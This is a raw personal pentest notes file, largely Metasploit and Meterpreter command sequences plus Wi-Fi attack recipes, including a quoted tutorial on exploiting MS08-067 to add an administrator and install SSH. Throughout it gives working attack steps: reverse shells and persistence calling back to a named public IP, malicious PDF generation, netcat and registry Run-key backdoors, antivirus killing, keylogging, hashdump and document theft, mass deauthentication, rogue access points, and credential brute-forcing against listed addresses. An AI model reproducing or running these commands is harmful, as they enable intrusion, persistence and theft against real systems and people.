            3 at a time max ..
            screen
            ruby warvox.rb ( run warvox in screen so you can screen -r if you get dropped google screen Manuel ... )
            use SELF as the caller ID
            ranges are 15555555555:15555555555
            or 155555XXX
            
             
            SELECT * FROM DIAL_RESULTS where completed = 'f' and dial_job_id >= '68' and busy = 'f' and ringtime <= '52';
            * if don.t add the .and ringtime <= '52' I get 2K hits . I would assume this is because it if did not answer it labeled it as not completed instead of labeling it timeout for some reason ?
            * ~700 ringtime <= '52' with no data file... some high ringtimes but most were instant busy signal but not marked as complete or busy with no data file
            SELECT count(*) FROM DIAL_RESULTS where dial_job_id = '110' and line_type = 'voice' ;
            SELECT count(*) FROM DIAL_RESULTS where dial_job_id = '110' and line_type = 'fax' ;
            SELECT count(*) FROM DIAL_RESULTS where dial_job_id = '110' and line_type = 'modem' ;
            SELECT * FROM DIAL_RESULTS where dial_job_id = '110' and busy = 't';
                
            
            rcracki_mt /s2/LM/lm_alpha-numeric-symbol32-space#1-7_* -f /usr/local/sbin/hash
            rcrack /s2/LM/lm_alpha-numeric-symbol32-space#1-7_* -f hash2

example input file 4ee is null or blank
-------------------

            # Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
            #notes
            http://ob-security.info/?tag=hashcat
            
            
            
            
            
            wget -O giskismet-0.02.tar.gz \
            "http://my-trac.assembla.com/giskismet/browser/tags/giskismet-0.02.tar.gz?format=raw"
            tar -xzvf giskismet-0.02.tar.gz
            rm giskismet-0.02.tar.gz
            
            We need a few packages first.
            
            apt-get update
            apt-get install libxml-libxml-perl libdbi-perl libdbd-sqlite3-perl -y
            
            Do the install
            
            
            cd giskismet-0.02
            perl Makefile.PL
            make
            make install
            
            
            
            giskismet -x wardrive.netxml
            giskismet -q "select * from wireless" -o output.kml
            
            
            giskismet -q 'select * from wireless where ESSID like "_%"' wireless.dbl  -o ouput2.kml
            
            
            Before we map our dat
            
            # following steps are for BT4:
            # edit the kismet.conf and add the /dev/ttyUSB0 etc .. (find / -name kismet.conf )

load the kernal mod for garmin gps
-------------------

            modprobe garmin_gps

plugin the the garmion GPS18 USB puck
-------------------

            # if I dont run this command it hangs and kill -9 will not even work so have to reboot
            mount -t usbfs none /proc/bus/usb/
            # setup gpsd shoud show changy bits so you know it is trying to lock !
            dpkg-reconfigure gpsd
            #start gpsd
            /etc/init.d/gpsd stop
            gpsd -N -n -D 2 /dev/ttyUSB0
            # test
            ls -al /dev/ttyUSB0
            xgps
            #also test by
            telnet localhost 2947
            # in kismet you will get nodata untill it has a lock ( this took upto 500seconds in xgps ) you can run XGPS and KISMET at the same time.
            
            /etc/init.d/wicd stop
            /etc/init.d/networking stop
            killall dhclient dhcpcd
               
            
            
            Ubuntu Packages - For whatever reason, Ubuntu has stopped updating Kismet in their repositories.
            
            To add Kismet as a repository and get updates automatically, add the following to your /etc/apt/sources.lst or to /etc/apt/sources.list.d/kismet.list:
            
                For Ubuntu Oneiric (11.10): deb https://www.kismetwireless.net/code/ oneiric kismet
                For Ubuntu Precise (12.04): deb https://www.kismetwireless.net/code/ precise kismet
                For Ubnutu Quantal (12.10): deb https://www.kismetwireless.net/code/ quantal kismet
            
            
                To add the Kismet signing key (signed by my primary key, available above) to your trusted keys:
            
                curl https://www.kismetwireless.net/code/dists/kismet-release.gpg | sudo apt-key add - 
            

ssh logins
-------------------

            use auxiliary/scanner/ssh/ssh_login
            set RHOSTS 10.13.102.2,177
            set USER_FILE "C:/wordlist/password_small.txt"
            set RHOSTS_FILE "C:/wordlist/targests.txt"
            run
            back
            use auxiliary/gather/dns_enum
            set DOMAIN 10.21.1.69
            run
            
             
            
              
            
            --------------------------------------
            
            airbase notes
            ------------
            mass deauth
            # broken because you need listen on the right channel before you deauth ... so I need channel and sesstion and ap info all in one line ..
            # cleanup
            rm -f clients*.csv

dump clients
-------------------

            airodump-ng mon0 -o csv -w clients &

lets sleep on it we need station ids
-------------------

            sleep 60
            killall airodump-ng

make script to mass deauth
-------------------

            grep -ia -A 10000  Station clients*.csv |egrep -v "(not|Station)" | sed 's/,/ /g' | awk '{print "aireplay-ng -0 1 -a",$8,"mon0 --ignore-negative-one  -c",$1}'|grep : > killclients
            bash -x killclients
            -----------------------------------------------
            gogogo
            ----------------
            ^Croot@bt:/stuff/airbase# cat GO
            
            killall  avahi-daemon avahi-daemon NetworkManager wpa_supplicant
            killall dhcpd3 dhclient dhclient3 dhcpcd dhcpd
            airmon-ng start wlan1
            sleep 5
            xterm -e "airbase-ng -c 6 -P mon0 -v" &
            sleep 5
            ifconfig at0 up 10.0.0.1 netmask 255.255.255.0 &
            dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0 &
            sleep 5
            cd /pentest/exploits/framework &
            xterm -e "tcpdump -i at0 -n port 67 and port 68"  &
            sleep 5
            xterm -e "/pentest/exploits/framework/msfconsole -r /pentest/exploits/framework/karma.rc"
            ------------------

depends for airdcrack
-------------------

            
            apt-get install build-essential  -y
            apt-get install libssl-dev -y
            apt-get install openssl-dev -y
            apt-get install partimage gparted lynx links curl nmap iotop screen medusa trafshow wireshark -y --force-yes

more depends set autopwn
-------------------

            apt-get install upx-ucl upx-nrv -y
            apt-get install build-essential ruby libruby rdoc libyaml-ruby libzlib-ruby libopenssl-ruby libdl-ruby libreadline-ruby libiconv-ruby libgtk2-ruby libglade2-ruby subversion sqlite3 libsqlite3-ruby irb -y
            apt-get install ruby libruby rdoc -y
            apt-get install libyaml-ruby -y
            apt-get install libzlib-ruby -y
            apt-get install libopenssl-ruby -y
            apt-get install libdl-ruby -y
            apt-get install libreadline-ruby -y
            apt-get install libiconv-ruby -y
            apt-get install rubygems -y
             
            #apt-get install postgresql postgresql-client postgresql-contrib -y
            apt-get install pgadmin3 -y
            apt-get install python-pymssql -y
            gem1.8 install rails

get set and msf
-------------------

            mkdir /pentest/
            mkdir /pentest/exploits
            cd /pentest/exploits
            # check out /install  aircrack latest
            svn co http://trac.aircrack-ng.org/svn/trunk/ aircrack-ng
            cd aircrack-ng
            make clean
            make
            make install
            airodump-ng-oui-update

create mon0
-------------------

            airmon-ng start wlan1
            # start airbase on mon0 it creates at0 to us with dhcpd ! ( may not need to include channel ... )
            airbase-ng -c 6 -P mon0 -v

install dhcp3 server
-------------------

            apt-get install  dhcp3-server -y
            -----------------------------------------------------------
            # DHCP CONF
            cat /etc/dhcp3/dhcpd.conf
            ----------------------------------------------------------------
            option domain-name-servers 10.0.0.1;
            default-lease-time 60;
            max-lease-time 72;
            ddns-update-style none;
            authoritative;
            log-facility local7;
            subnet 10.0.0.0 netmask 255.255.255.0 {
            range 10.0.0.100 10.0.0.254;
            option routers 10.0.0.1;
            option domain-name-servers 10.0.0.1;
            }
            -------------------------------------------------------------------------------

setup at0 interface that airbase created to listen on IP configured for dhcp server
-------------------

            ifconfig at0 up 10.0.0.1 netmask 255.255.255.0

start dhcp server
-------------------

            dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0
            # cd to framework root ..
            cd /pentest/exploits/framework
            wget http://digitaloffense.net/tools/karma.rc -O karma.rc
            # start msfconsole using the mass client sides basicly karma.rc
            msfconsole -r karma.rc
            # start TCP dump looking for DHCP requests from the remote host !
            tcpdump -i at0 -n port 67 and port 68
            # mass client side too buggy ... to many iframes ... come back to it ... try SMB_REPLAY attack ...? or limit client side attacks ?
            # for mass client side attack using etterfilter for targets:
            apt-get install ettercap -y

run mass client side attack
-------------------

            cd /pentest/exploits/fasttrack
            fast-track.py -i
            # choose mass client side attack etc and run metasploitloadfile manuely ...
            # when all is running etc ....  start msfconsole with the metasploitloadfile script in the base folder of fasttrack
            msfconsole -r metasploitloadfile
            http://digitaloffense.net/tools/karma.rc
            +-+-+-
            airmon-ng start wlan0
            airbase-ng -c 9 -P -C60  -z 2 -W 1 mon0
            ifconfig wlan0 up 10.0.0.1 netmask 255.255.255.0
                dhcpd3 -cf /etc/dhcp3/dhcpd.conf -f log wlan0
            killall dhclient dhcpcd dhclient3
            airmon-ng start wlan1
            airbase-ng -c 9 -P -C60  -z 2 -W 1 mon1
            ifconfig wlan1 up 10.0.0.1 netmask 255.255.255.0
            dhcpd3 -cf /etc/dhcp3/dhcpd.conf -f log wlan1
            iptables --table nat --append POSTROUTING --out-interface eth1 -j MASQUERADE
            iptables --append FORWARD --in-interface at0 -j ACCEPT
            echo 1 > /proc/sys/net/ipv4/ip_forward
            #airbase-ng -c 9 -P -C60  -z 2 -W 1 mon1
            00:0C:43:41:46:34  -37           13            2        0   6  54e. WPA  TKIP   PSK  rmccurdyDOTcom1                                                                       
             
            airbase-ng -c 6 -a  00:0C:43:41:46:34 -C60  -z 2 -W 1 -v --essid rmccurdyDOTcom1 mon0
            dhcpd3 -cf /etc/dhcp3/dhcpd.conf -f log wlan1
            i
            dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0
            tcpdump -i at0 -n port 67 and port 68
             armatage
            apt-get install -y postgresql
            apt-get install libpq-dev -y
            gem install postgres
             
            /etc/init.d/postgresql start
            
             
            
            su -
            su - postgres
             
            
            createuser msf_user -P
            createdb --owner=msf_user msf
              
            /pentest/exploits/framework/msfrpcd -f -U msf -P msf -t Basic
            /pentest/exploits/framework/armitage
            wifi notes
            ------------------------
            internet@rmccurdydotcom /cygdrive/c/temp
            # egrep "BSSID|<manuf>|<max_signal_dbm>|<ssid>" "Kismet-20110929-11-17-47-1.net
            xml" | tr -d '\n' |  awk '{gsub("<BSSID>",",\n"); print}' | sed -e 's/<\/BSSID>
            /,/g' -e 's/        <manuf>//g' -e 's/<\/manuf>//g' -e 's/          <max_signal_dbm>/,/
            g' -e 's/<\/max_signal_dbm>/,/'g -e 's/                <ssid>/,/g' -e 's/<\/ssid>//
            g'> 2.csv
            internet@rmccurdydotcom /cygdrive/c/temp

load the kernal mod for garmin gps
-------------------

            modprobe garmin_gps 

plugin the the garmion GPS18 USB puck
-------------------

            # if I dont run this command it hangs and kill -9 will not even work so have to reboot 
            mount -t usbfs none /proc/bus/usb/

setup gpsd
-------------------

            dpkg-reconfigure gps
            # test
            ls -al /dev/ttyUSB0
            xgps 
            #also test by
            telnet localhost 2947
            # in kismet you will get nodata untill it has a lock ( this took upto 500seconds in xgps ) you  can run XGPS and KISMET at the same time.
            
            ------------------------
            
            
            
            
            ----------------------
            
            use exploit/multi/handler
            set PAYLOAD windows/meterpreter/reverse_tcp
            set LHOST rmccurdy.com
            set LPORT 21
            set ExitOnSession false

set AutoRunScript pathto script you want to autorun after exploit is run
-------------------

            set AutoRunScript persistence -r 75.139.158.51 -p 21 -A -X -i 30
            
            exploit -j -z
            
            
            

file_autopwn
-------------------

            rm -Rf /tmp/1
            mkdir /tmp/1
            rm -Rf ~/.msf3
            
            wget -O /tmp/file3.pdf https://www1.nga.mil/Newsroom/PressReleases/Press%20Releases/nga10_02.pdf
            
            ./msfconsole
            
            db_driver sqlite3
            db_create pentest11
            setg LHOST 75.139.158.51
            setg LPORT 21
            setg SRVPORT 21
            setg LPORT_WIN32 21
            
            setg INFILENAME /tmp/file3.pdf
            
            
            use auxiliary/server/file_autopwn
            
            set OUTPATH /tmp/1
            
            set URIPATH /msf
            set SSL true
            set ExitOnSession false
            set PAYLOAD windows/meterpreter/reverse_tcp
            setg PAYLOAD windows/meterpreter/reverse_tcp
            set AutoRunScript persistence -r 75.139.158.51 -p 21 -A -X -i 30
            run
            
            
            

shows all the scripts
-------------------

            run [tab]
            
            # persistence! broken ...if you use DNS name ..
            run persistence -r 75.139.158.51 -p 21 -A -X -i 30
            # new method run persistence -U -i 5 -p 443 -r 192.168.1.71
            
            run get_pidgin_creds
            
            idletime
            sysinfo
            
            
            # SYSTEM SHELL ( pick a proc that is run by system )
            migrate 376
            shell
            

session hijack tokens
-------------------

            use incognito
            impersonate_token "NT AUTHORITY\\SYSTEM"
            

eslcate to system
-------------------

            use priv
            getsystem
            
            
            execute -f cmd.exe -H -c -i -t
            execute -f cmd.exe -i -t
            

list top used apps
-------------------

            run prefetchtool -x 20
            

list installed apps
-------------------

            run prefetchtool -p
            
            run get_local_subnets
            

find and download files
-------------------

            run search_dwld "%USERPROFILE%\\my documents" passwd
            run search_dwld "%USERPROFILE%\\desktop passwd
            run search_dwld "%USERPROFILE%\\my documents" office
            run search_dwld "%USERPROFILE%\\desktop" office
            
            # alternate
            download -r "%USERPROFILE%\\desktop"  ~/
            download -r "%USERPROFILE%\\my documents"  ~/
            

alternate to shell not SYSTEM
-------------------

            # execute -f cmd.exe -H -c -i -t
            
            

does some run wmic commands etc
-------------------

            run winenum
            
            
            

rev shell the hard way
-------------------

            run scheduleme -m 1 -u /tmp/nc.exe -o "-e cmd.exe -L -p 8080"
            
            # An example of a run of the file to download via tftp of Netcat and then running it as a backdoor.
            run schtasksabuse-dev -t 192.168.1.7 -c "tftp -i 192.168.1.8 GET nc.exe,nc -L -p 8080 -e cmd.exe" -d 4
            run schtasksabuse -t 192.168.1.7 -c "tftp -i 192.168.1.8 GET nc.exe,nc -L -p 8080 -e cmd.exe" -d 4
            
            # vnc / port fwd for linux
            run vnc
            
            # priv esc
            run kitrap0d
            
            
            
            run getgui
             
            # somewhat broken .. google sdt cleaner  NtTerminateProcess !@?!?!
            run killav
            
            run winemun
             
            run memdump
            
            run screen_unlock
            
            upload /tmp/system32.exe C:\\windows\\system32\\
            reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
            reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v system32 -d "C:\\windows\\system32\\system32.exe -Ldp 455 -e cmd.exe"
            reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v system32
            reg enumkey -k HKLM\\system\\controlset001\services\\sharedaccess\\parameters\\firewallpolicy\\Standardprofile\\authorizedapplications\\list
            reg setval -k HKLM\\system\\controlset001\services\\sharedaccess\\parameters\\firewallpolicy\\Standardprofile\\authorizedapplications\\list -v sys
            reg queryval -k HKLM\\system\\controlset001\services\\sharedaccess\\parameters\\firewallpolicy\\Standardprofile\\authorizedapplications\\list -v system32
            upload /neo/wallpaper1.bmp "C:\\documents and settings\\pentest3\\local settings\\application data\\microsoft\\"
            
            
            
            
            getuid
            ps
            getpid
            keyscan_start
            keyscan_dump
            migrate 520
            portfwd add -L 104.4.4 -l 6666 -r 192.168.1.1 -p 80"
            portfwd add -L 192.168.1.1 -l -r 10.5.5.5 -p 6666
            
            shell
            run myremotefileserver_mserver -h
            run myremotefileserver_mserver -p 8787
            
            run msf_bind
            run msf_bind -p 1975
            rev2self
            getuid
            
            getuid
            
            
            
            enumdesktops
            grabdesktop
            
            run deploymsf -f framework-3.3-dev.exe
            
            run hashdump
            run metsvc
            run scraper
            run checkvm
            run keylogrecorder
            run netenum -fl -hl localhostlist.txt -d google.com
            run netenum -rl -r 10.192.0.50-10.192.0.254
            run netenum -st -d google.com
            run netenum -ps -r 10.192.0.50-254
            
            

Windows Login Brute Force Meterpreter Script
-------------------

            run winbf -h
            

upload a script or executable and run it
-------------------

            uploadexec
            
            

Using Payload As A Backdoor  from a shell
-------------------

            
            REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\Curre ntVersion\Run /v firewall /t REG_SZ /d "c:\windows\system32\metabkdr.exe" /f
            at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\metabkdr.exe"
            SCHTASKS /Create /RU "SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "%USERPROFILE%\metabkdr.exe"  /ED 11/11/2011
            
            
            
            # kill AV this will not unload it from mem it needs reboot or kill from memory still ... Darkspy, Seem, Icesword GUI can kill the tasks
            catchme.exe  -K "c:\Program Files\Kaspersky\avp.exe"
            catchme.exe  -E "c:\Program Files\Kaspersky\avp.exe"
            catchme.exe  -O "c:\Program Files\Kaspersky\avp.exe" dummy
            

Nessus log watch
-------------------

            watch -n 20 -d 'tail -10  /opt/nessus/var/nessus/logs/nessusd.messages|grep -v "not an error"'
            
            Nessus Scanning through a Metasploit Meterpreter Session
            By
            Mark Baggett
            on March 16, 2010 6:44 AM | Permalink
            
            By Mark Baggett
            
            Scenario: You are doing a penetration test. The client's internet face is locked down pretty well. No services are exposed externally and only HTTP/HTTPS are allowed OUT of the corporate firewall. You email in a carefully crafted email with the meterpreter attacked. An accommodating users is more than happy to click your attachment giving you meterpreter access to their machine. Now what? How about using Nessus to scan all the services on their internal network? Here is a tutorial on how to do it.
            
            The Players
            Attacker 172.16.186.132
            Victim 172.16.186.126
            
            Step 1 - After you have meterpreter access install OpenSSH on the victim's computer. Joff Thyer, packet guru, crazy aussie and all around smart guy did a great job of outlining the install process on his blog. I pretty much just followed his instructions here.
            
            Step 2 - After you've installed OpenSSH and setup your account use Meterpreters PORTFWD command to forward a port from the attacker's machine to the SSH listener on the victim's machine. For example:
            
            meterpreter> portfwd add -L 172.16.186.132 -l 8000 -r 172.16.186.128 -p 22
            
            This command sets up a listener on port 8000 of the attacker's IP (172.16.186.132) and forwards packets to port 22 on the victim's machine (172.16.186.128).
            
            
            Step 3 - SSH into the portfwd port you just created and setup a dynamic port forwarder on your machine. For example:
            
            # ssh -D 127.0.0.1:9000 -p 8000 username@172.16.186.132
            
            This command sets up a SOCKS4 proxy on port 9000 which is forwarded through the SSH session on the victim.
            
            Step 4 - Use PROXYCHAINS to forward your nessusd traffic through the SOCKS4 listener on port 9000. This is as simple as changing the TCP port on the last line of /etc/proxychains.conf from its default of 9050 to port 9000 and launching nessusd through proxychains as follows:
            
            # proxychains /usr/sbin/nessusd -D
            
            Step 5 - Start the nessus client and do you scan.
            
            Preparing for a custom command line OpenSSH Installation in your lab
            
            The basic steps to prepare a command line OpenSSH installation for Windows are as follows:
            
            1. Download the setupssh.exe installation package from http://sshwindows.sourceforge.net/download
            
            2. Run the GUI installer package on your Windows lab/test machine. I suggest accepting the default program location of C:\Program Files\OpenSSH
            
            3. Get a full copy of all of the files under the directory C:\Program Files\OpenSSH onto a USB flash drive or other favorite media. Copy recursively with XCOPY and make sure you fully retain the directory structure.
            
            4. Export the following registry keys using the REG EXPORT command as follows:
            
            REG EXPORT .HKLM\SOFTWARE\Cygnus Solutions. 1.REG
            REG EXPORT .HKLM\SYSTEM\CurrentControlSet\Services\OpenSSHd. 2.REG
            REG EXPORT .HKLM\SYSTEM\ControlSet001\Services\OpenSSHd. 3.REG
            
            5. Concatenate all of these registry files together into one file.
            TYPE 1.REG 2.REG 3.REG >OPENSSH.REG
            
            6. Save this OPENSSH.REG file into your local copy of all of the openssh directory structure.
            
            
            Performing an installation via command shell
            
            Now that you have all of this data saved on your USB thumb drive, lets assume that our penetration testing machine is a CentOS Linux operating system with IP address of 192.168.1.37, and that our target is a Windows 2003 SP0 machine with IP address of 192.168.1.40. Our penetration testing Linux machine has our OpenSSH package files mounted under /mnt/PenTestTools/win32/OpenSSH.
            
            Our target happens to have the MS08-067 Server Service RPC vulnerability. Below is an example of how we exploit this vulnerability using Metasploit (www.metasploit.com) with the Meterpreter payload, upload our OpenSSH server files, add a new username, perform some minimal configuration and start the OpenSSH service.
            
            
            Exploiting the Vulnerability
            
            [root@localhost framework-3.2]# nc -v 192.168.1.40 445
            Connection to 192.168.1.40 445 port [tcp/microsoft-ds] succeeded!
            [root@localhost framework-3.2]# ./msfconsole
            
            msf > search exploits ms08_067
            [*] Searching loaded modules for pattern 'ms08_067'...
            Exploits
            ========
            Name Description
            ---- -----------
            windows/smb/ms08_067_netapi Microsoft Server Service Relative Path Stack Corruption
            msf > use windows/smb/ms08_067_netapi
            
            msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/bind_tcp
            PAYLOAD => windows/meterpreter/bind_tcp
            msf exploit(ms08_067_netapi) > set RHOST 192.168.1.40
            RHOST => 192.168.1.40
            msf exploit(ms08_067_netapi) > set TARGET 5
            TARGET => 5
            msf exploit(ms08_067_netapi) > show options
            
            ... truncated output ...
            Exploit target:
            
            Id Name
            -- ----
            5 Windows 2003 SP0 Universal
            
            
            msf exploit(ms08_067_netapi) > exploit
            [*] Started bind handler
            [*] Triggering the vulnerability...
            [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
            [*] Sending stage (2650 bytes)
            [*] Sleeping before handling stage...
            [*] Uploading DLL (75787 bytes)...
            [*] Upload completed.
            [*] Meterpreter session 1 opened (192.168.1.37:45633 -> 192.168.1.40:4444)
            
            meterpreter > sysinfo
            Computer: SYSTEM-HJ28HHGL7N
            OS : Windows .NET Server (Build 3790, ).
            
            
            Uploading your OpenSSH Files
            
            meterpreter > lcd /mnt/PenTestTools/win32/OpenSSH
            meterpreter > lpwd
            /mnt/PenTestTools/win32/OpenSSH
            meterpreter > cd \
            meterpreter > cd "Program Files"
            meterpreter > mkdir openssh
            Creating directory: openssh
            meterpreter > cd openssh
            meterpreter > pwd
            C:\Program Files\openssh
            meterpreter > upload -r . .
            [*] uploading : ./uninstall.exe -> .\uninstall.exe
            [*] uploaded : ./uninstall.exe -> .\uninstall.exe
            [*] mirroring : ./bin -> .\bin
            [*] uploading : ./bin/chmod.exe -> .\bin\chmod.exe
            [*] uploaded : ./bin/chmod.exe -> .\bin\chmod.exe
            [*] uploading : ./bin/chown.exe -> .\bin\chown.exe
            [*] uploaded : ./bin/chown.exe -> .\bin\chown.exe
            [*] uploading : ./bin/cygcrypto-0.9.7.dll -> .\bin\cygcrypto-0.9.7.dll
            [*] uploaded : ./bin/cygcrypto-0.9.7.dll -> .\bin\cygcrypto-0.9.7.dll
            .... lots of output truncated ....
            
            meterpreter > execute -f cmd.exe .i
            Process 848 created.
            Channel 66 created.
            
            
            
            Modifying the Registry and Adding Your Own Username
            
            Here, we import all of our registry keys, then add our own username making sure to put it into the administrators group. Then we create the passwd and group files that OpenSSH needs for authentication purposes.
            
            
            Microsoft Windows [Version 5.2.3790]
            (C) Copyright 1985-2003 Microsoft Corp.
            C:\Program Files\openssh>whoami
            whoami
            nt authority\system
            
            C:\Program Files\openssh>reg import openssh.reg
            reg import openssh.reg
            The operation completed successfully.
            
            C:\Program Files\openssh>net user inet_p0wned gameover /add
            net user inet_p0wned gameover /add
            The command completed successfully.
            
            
            C:\Program Files\openssh>net localgroup administrators inet_p0wned /add
            net localgroup administrators inet_p0wned /add
            The command completed successfully.
            
            
            C:\Program Files\openssh>cd etc
            cd etc
            
            C:\Program Files\openssh\etc>..\bin\mkpasswd -l >passwd
            ..\bin\mkpasswd -l >passwd
            C:\Program Files\openssh\etc>..\bin\mkgroup -l >group
            ..\bin\mkgroup -l >group
            
            C:\Program Files\openssh\etc>sc create opensshd binpath= "c:\program files\openssh\bin\cygrunsrv.exe" start= auto
            sc create opensshd binpath= "c:\program files\openssh\bin\cygrunsrv.exe" start= auto
            [SC] CreateService SUCCESS
            
            
            
            Start the OpenSSH Service
            
            C:\Program Files\openssh\etc>sc start opensshd
            sc start opensshd
            SERVICE_NAME: opensshd
            TYPE : 10 WIN32_OWN_PROCESS
            STATE : 2 START_PENDING
            (NOT_STOPPABLE, NOT_PAUSABLE,
            IGNORES_SHUTDOWN))
            WIN32_EXIT_CODE : 0 (0x0)
            SERVICE_EXIT_CODE : 0 (0x0)
            CHECKPOINT : 0x0
            WAIT_HINT : 0x7d0
            PID : 1916
            FLAGS :
            
            C:\Program Files\openssh\etc>sc query opensshd
            sc query opensshd
            SERVICE_NAME: opensshd
            TYPE : 10 WIN32_OWN_PROCESS
            STATE : 4 RUNNING
            (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN))
            WIN32_EXIT_CODE : 0 (0x0)
            SERVICE_EXIT_CODE : 0 (0x0)
            CHECKPOINT : 0x0
            WAIT_HINT : 0x0
            
            C:\Program Files\openssh\etc>netsh firewall add port protocol=tcp port=22 name=sshd mode=enable scope=custom addresses=192.168.1.0/24
            
            The following command was not found: firewall add port protocol=tcp port=22 name=sshd mode=enable scope=custom addresses=192.168.1.0/24**
            
            **Note: adding a port for the firewall is necessary if the firewall exists. If not, then you will get the command not found error message. It is a good idea to restrict the source networks so that you don.t leave a gaping opportunity while testing.
            
            C:\Program Files\openssh\etc>exit
            exit
            meterpreter > quit
            
            [*] Meterpreter session 1 closed.
            msf exploit(ms08_067_netapi) > quit
            
            
            
            
            
            Now, lets go ahead and SSH into our Windows server to check if things worked!
            
            
            root@localhost:~/framework-3.2]# ssh inet_p0wned@192.168.1.40
            The authenticity of host '192.168.1.40 (192.168.1.40)' can't be established.
            RSA key fingerprint is ab:c8:bf:9f:b2:38:32:1d:6f:2b:34:a5:d0:99:dc:49.
            Are you sure you want to continue connecting (yes/no)? yes
            Warning: Permanently added '192.168.1.40' (RSA) to the list of known hosts.
            
            OpenSSH for Windows. Welcome aboard!
            
            inet_p0wned@192.168.1.40's password:
            Could not chdir to home directory /home/inet_p0wned: No such file or directory
            Microsoft Windows [Version 5.2.3790]
            (C) Copyright 1985-2003 Microsoft Corp.
            C:\Program Files\OpenSSH>
            C:\Program Files\OpenSSH>whoami
            system-hj28hhgl7n\inet_p0wned
            
            C:\Program Files\OpenSSH>exit
            Connection to 192.168.1.40 closed.
            [root@localhost framework-3.2]#
            
            
            Cleaning up
            
            To clean up everything when you are finished, you need to delete the OpenSSH service, delete the registry keys and remove all of the relevant files. The following recipe should work reasonably well from a command shell. Remember that you cannot be using OpenSSH when deleting the service! So, you may need to exploit again with shell code before removing it.
            
            C:\> SC STOP opensshd
            C:\> SC DELETE opensshd
            C:\> REG DELETE .HKLM\SOFTWARE\Cygnus Solutions. /f /va
            C:\> REG DELETE .HKLM\SYSTEM\ControlSet001\Services\OpenSSHd. /f /va
            C:\> REG DELETE .HKLM\SYSTEM\CurrentControlSet\Services\OpenSSHd. /f /va
            
            C:\> CD "\Program Files"
            C:\Program Files> RMDIR /Q /S opensshd
            C:\Program Files> NETSH FIREWALL DELETE PORT TCP 22
            C:\Program Files> NET USER inet_p0wned /DELETE # pivot
            http://www.offensive-security.com/metasploit-unleashed/Pivoting
            
            use exploit/windows/smb/psexec
            set RHOST 10.1.13.2
            set SMBUser Administrator
            set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
            set PAYLOAD windows/meterpreter/bind_tcp
            exploit
            
            
            
            # make exe
            ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.6.55 LPORT=443 R | ./msfencode -t exe -c 5 -o /tmp/bob.exe
            

attacker listen
-------------------

            use exploit/multi/handler
            set PAYLOAD windows/meterpreter/reverse_tcp
            set LHOST 192.168.6.55
            set LPORT 443
            set ExitOnSession false

set AutoRunScript pathto script you want to autorun after exploit is run
-------------------

            set AutoRunScript persistence -r 192.168.6.55 -p 443 -A -X -i 30
            
            exploit -j -z
             
            
            # armatage
            apt-get install mysql-server -y
            /etc/init.d/mysql start
            
            mysqladmin -u root -ppassword password toor
            
            
            /pentest/exploits/framework/msfrpcd -f -U msf -P test -t Basic
            
            
            
            # armatage
            
            apt-get install -y postgresql
            
            apt-get install libpq-dev -y
            
            gem install postgres
            
            /etc/init.d/postgresql start
            
            
            su -
            su - postgres
             
            
            createuser msf_user -P
            createdb --owner=msf_user msf
             
            
            
            /pentest/exploits/framework/msfrpcd -f -U msf -P msf -t Basic
            /pentest/exploits/framework/armitage
            
            
            
            
            net user newuserhere PASSWORDHERE /add
            net localgroup administrators newuserhere /add
            
            
            "c:\program files\nmap\nmap.exe" -vvv -n -p 1527,3200,3201,3300,3600,8000,8100,8101,40000-40005,50013,50113 -A 192.168.56,14,6,7,8,9.1-255 -oA sap
            
             ----
            
             
            
            
            # ssh
            use auxiliary/scanner/ssh/ssh_login
            
            #set RHOSTS_FILE "C:/backup/wordlist/targests.txt"
            
            
            set RHOSTS 4.59.139.135 4.59.139.136 4.59.139.140 63.116.61.25 63.116.61.26 63.116.61.34
            # set USER_FILE "C:/backup/wordlist/password_large.txt"
            set USERPASS_FILE "C:/backup/wordlist/root_userpass.txt"
            set VERBOSE true
            set STOP_ON_SUCCESS true
            set BRUTEFORCE_SPEED 5

set this to the number of host
-------------------

            set THREADS 6
            
            run
            
            
            
            use auxiliary/gather/dns_enum
            set DOMAIN domain.com
            run
            
            
            #smb
            
            use auxiliary/scanner/smb/smb_login
            
            set RHOSTS file://192.168.8.39
            set RHOSTS 127.0.0.1
            
            set USER_FILE "C:/wordlist/users.txt"
            set PASS_FILE "C:/wordlist/2.txt"
            set VERBOSE false
            # set to number of host scanning .
            set THREADS 16
            
            set STOP_ON_SUCCESS true
            set VERBOSE true
            set BLANK_PASSWORDS false
             
            
            # http
            
            use auxiliary/scanner/http/http_login
            set AUTH_URI /folder?dcPath=ha-datacenter
            set RHOSTS 127.0.0.1 127.0.0.1 127.0.0.1
            set VERBOSE true
            run
            
            
            
            
            back
            
            # telnet
            use auxiliary/scanner/telnet/telnet_login
            set RHOSTS 127.0.0.1,49,50
            
            set PASS_FILE "C:/wordlist/password_small.txt"
            set THREADS 254
            run
            
            
            
            back
            
            
            # mssql
            use auxiliary/scanner/mssql/mssql_login
            set RHOSTS 127.0.0.1
            set PASS_FILE "C:/wordlist/password_small.txt"
            set USERNAME sa
            set VERBOSE false
            run
            
            
            back
            
             
            
            #ftp
            use auxiliary/scanner/ftp/ftp_login
            set RHOSTS  127.0.0.1
            set PASS_FILE /home/administrator/alcoa/alcoa_small.txt
            set USER_FILE /home/administrator/alcoa/alcoa_small.txt
            set BRUTEFORCE_SPEED 1
            run
            
            
            
            #snmp
            use auxiliary/scanner/snmp/snmp_login
            set RHOSTS  127.0.0.1
            set PASS_FILE "C:/wordlist/snmp_default_pass.txt"
            set VERBOSE false
            
            run
            
            
            
            nmap --script=smtp-open-relay.nse -p 25 -iL 25 -n
            
            
            ./sfuzz -T O -f sfuzz-sample/basic.http -S 50.74.10.218 -p 179
            
            

